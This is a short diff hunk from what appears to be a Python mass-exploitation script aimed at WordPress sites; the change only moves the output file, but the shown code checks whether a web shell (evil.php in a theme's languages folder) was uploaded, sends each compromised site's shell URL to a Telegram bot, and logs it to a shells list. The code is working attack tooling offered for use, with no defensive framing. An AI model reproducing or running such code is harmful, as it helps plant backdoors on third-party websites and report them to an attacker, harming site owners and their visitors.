@@ -67,7 +67,7 @@ def Exploit(Domain):
           if 'Ev1lSTORE' in req1:
             print (fw+' [>>] '+ Domain +fg+ ' [Shell Uploaded]')
             tg = requests.get('https://api.telegram.org/bot'+ token +'/sendMessage?chat_id='+ id +'&text='+Domain + '/wp-content/themes/'+i+'/languages/evil.php' + '\n')
-            open('Shells.txt', 'a').write(Domain + '/wp-content/themes/'+i+'/languages/evil.php' + '\n')
+            open('MrxTawFik/Shells.txt', 'a').write(Domain + '/wp-content/themes/'+i+'/languages/evil.php' + '\n')
             break
           else:
             print (fw+' [<<] '+ Domain +fr+ ' [Not Vulnerable]')
